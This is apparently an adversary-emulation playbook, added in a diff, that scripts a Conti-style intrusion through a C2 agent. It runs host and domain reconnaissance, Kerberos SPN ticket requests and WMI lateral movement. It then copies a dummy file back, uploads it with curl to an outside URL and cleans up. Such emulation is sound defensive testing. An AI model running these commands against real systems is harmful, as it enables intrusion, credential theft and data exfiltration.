@@ -1,0 +1,382 @@
+# Conti Ransomware Simple Playbook
+
+variable "exfil_file" {
+    description = "File name to use for the exfil file."
+    default     = "exfil_file.txt"
+}
+
+variable "system_root_drive" {
+    description = "The drive letter where the system root resides for machines in the environment."
+    default     = "C"
+}
+
+variable "exfil_size" {
+    description = "Size of the exfil file to generate in megabytes."
+    default     = "524288000"
+}
+
+variable "c2_task_name" {
+    description = "The name of the C2 task that the agent is connected to."
+}
+
+variable "agent_name" {
+    description = "The name of the agent to control."
+}
+
+variable "lateral_movement_computer_name" {
+    description = "The computer name of the host that should be targeted by the lateral movement actions."
+}
+
+resource "workspace_put_url" "upload_url" {
+    path = "upload/"
+    filename = variable.exfil_file
+}
+
+action "agent_action" "cli_checks" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_shell_command"
+
+    execute_agent_shell_command = {
+        command           = "$commandArray = @({whoami},{query user},{ipconfig /all},{netstat -an},{netstat -rn},{echo done}); foreach ($command in $commandArray){& $command | Tee-Object -Variable commandOutput}; Write-Output $commandOutput"
+        wait_for_results  = "true"
+        completion_string = "done"
+    }
+}
+
+action "agent_action" "drive_info" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_shell_command"
+    depends_on = action.agent_action.cli_checks
+
+    execute_agent_shell_command = {
+        command          = "Get-PSDrive"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "systeminfo" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_shell_command"
+    depends_on = action.agent_action.drive_info
+
+    execute_agent_shell_command = {
+        command          = "systeminfo"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "win32_product" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_shell_command"
+    depends_on = action.agent_action.systeminfo
+
+    execute_agent_shell_command = {
+        command          = "Get-WmiObject -Class win32_Product"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "antivirusproduct" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_module"
+    depends_on = action.agent_action.win32_product
+
+    execute_agent_module = {
+        module            = "powershell/situational_awareness/host/antivirusproduct"
+        wait_for_results  = "true"
+        completion_string = "completed"
+    }
+}
+
+action "agent_action" "get_proxy" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_module"
+    depends_on = action.agent_action.antivirusproduct
+
+    execute_agent_module = {
+        module            = "powershell/situational_awareness/host/get_proxy"
+        wait_for_results  = "true"
+        completion_string = "completed"
+    }
+}
+
+action "agent_action" "get_uaclevel" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_module"
+    depends_on = action.agent_action.get_proxy
+
+    execute_agent_module = {
+        module            = "powershell/situational_awareness/host/get_uaclevel"
+        wait_for_results  = "true"
+        completion_string = "completed"
+    }
+}
+
+action "agent_action" "computerdetails" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_module"
+    depends_on = action.agent_action.get_uaclevel
+
+    execute_agent_module = {
+        module            = "powershell/situational_awareness/host/computerdetails"
+        wait_for_results  = "true"
+        completion_string = "completed"
+
+        module_args = {
+            Limit     = "100"
+            4648      = ""
+            4624      = ""
+            AppLocker = ""
+            PSScripts = ""
+            SavedRDP  = ""
+        }
+    }
+}
+
+action "agent_action" "seatbelt_user" {
+    delay      = "15"
+    timeout    = "300"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_module"
+    depends_on = action.agent_action.computerdetails
+
+    execute_agent_module = {
+        module            = "powershell/situational_awareness/host/seatbelt"
+        wait_for_results  = "true"
+        completion_string = "Completed"
+
+        module_args = {
+            Group        = "User"
+            Full         = "False"
+            Command      = ""
+            Computername = ""
+            Username     = ""
+            Password     = ""
+            Quiet        = ""
+        }
+    }
+}
+
+action "agent_action" "seatbelt_system" {
+    delay      = "15"
+    timeout    = "300"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_module"
+    depends_on = action.agent_action.seatbelt_user
+
+    execute_agent_module = {
+        module            = "powershell/situational_awareness/host/seatbelt"
+        wait_for_results  = "true"
+        completion_string = "Completed"
+
+        module_args = {
+            Group        = "System"
+            Full         = "False"
+            Command      = ""
+            Computername = ""
+            Username     = ""
+            Password     = ""
+            Quiet        = ""
+        }
+    }
+}
+
+action "agent_action" "get_domain_controller" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_module"
+    depends_on = action.agent_action.seatbelt_system
+
+    execute_agent_module = {
+        module            = "powershell/situational_awareness/network/powerview/get_domain_controller"
+        wait_for_results  = "true"
+        completion_string = "completed"
+    }
+}
+
+action "agent_action" "request_spn_tickets" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_module"
+    depends_on = action.agent_action.get_dfs_share
+
+    execute_agent_module = {
+        module            = "powershell/management/invoke_script"
+        wait_for_results  = "true"
+        completion_string = "completed"
+
+        module_args = {
+            ScriptPath = "/opt/havoc/shared/request_spn_tickets.ps1"
+            ScriptCmd  = "Invoke-RequestSpnTickets"
+        }
+    }
+}
+
+action "agent_action" "query_user" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_shell_command"
+    depends_on = action.agent_action.request_spn_tickets
+
+    execute_agent_shell_command = {
+        command          = "query user /SERVER:${variable.lateral_movement_computer_name}"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "get_services" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_shell_command"
+    depends_on = action.agent_action.query_user
+
+    execute_agent_shell_command = {
+        command          = "tasklist /s ${variable.lateral_movement_computer_name}"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "get_shares" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_shell_command"
+    depends_on = action.agent_action.get_services
+
+    execute_agent_shell_command = {
+        command          = "net view \\${variable.lateral_movement_computer_name} /All"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "create_remote_exfil_file" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_module"
+    depends_on = action.agent_action.get_shares
+
+    execute_agent_module = {
+        module            = "powershell/lateral_movement/invoke_wmi"
+        wait_for_results  = "false"
+        
+        module_args = {
+            ComputerName     = variable.lateral_movement_computer_name
+            Listener         = ""
+            Command          = "fsutil file createNew ${variable.system_root_drive}:\${variable.exfil_file} ${variable.exfil_size}"
+            CredID           = ""
+            Obfuscate        = ""
+            ObfuscateCommand = ""
+            Bypasses         = ""
+            UserName         = ""
+            Password         = ""
+            UserAgent        = ""
+            Proxy            = ""
+            ProxyCreds       = ""
+        }
+    }
+}
+
+action "agent_action" "pull_data" {
+    delay      = "180"
+    timeout    = "900"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_shell_command"
+    depends_on = action.agent_action.create_remote_exfil_file
+
+    execute_agent_shell_command = {
+        command          = "Copy-Item -Path \\${variable.lateral_movement_computer_name}\${variable.system_root_drive}$\${variable.exfil_file} -Destination ${variable.system_root_drive}:\${variable.exfil_file}"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "upload_exfil_file" {
+    delay      = "15"
+    timeout    = "600"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_shell_command"
+    depends_on = action.agent_action.pull_data
+
+    execute_agent_shell_command = {
+        command          = "${variable.system_root_drive}:\Windows\System32\curl.exe -s -H 'Content-Type:application/octet-stream' --upload-file ${variable.system_root_drive}:\${variable.exfil_file} '${resource.workspace_put_url.upload_url.workspace_put_url}'; echo done"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "delete_exfil_file" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_shell_command"
+    depends_on = action.agent_action.upload_exfil_file
+
+    execute_agent_shell_command = {
+        command          = "Remove-Item -Path ${variable.system_root_drive}:\${variable.exfil_file}"
+        wait_for_results = "true"
+    }
+}
+
+action "agent_action" "delete_remote_exfil_file" {
+    delay      = "15"
+    timeout    = "180"
+    task_name  = variable.c2_task_name
+    agent_name = variable.agent_name
+    command    = "execute_agent_shell_command"
+    depends_on = action.agent_action.delete_exfil_file
+
+    execute_agent_shell_command = {
+        command          = "Remove-Item -Path \\${variable.lateral_movement_computer_name}\${variable.system_root_drive}$\${variable.exfil_file}"
+        wait_for_results = "true"
+    }
+}
+
+action "task_action" "kill_stager" {
+    delay      = "10"
+    timeout    = "180"
+    depends_on = action.agent_action.delete_remote_exfil_file
+    task_name  = variable.c2_task_name
+    command    = "kill_agent"
+    
+    kill_agent = {
+        Name = variable.agent_name
+    }
+}
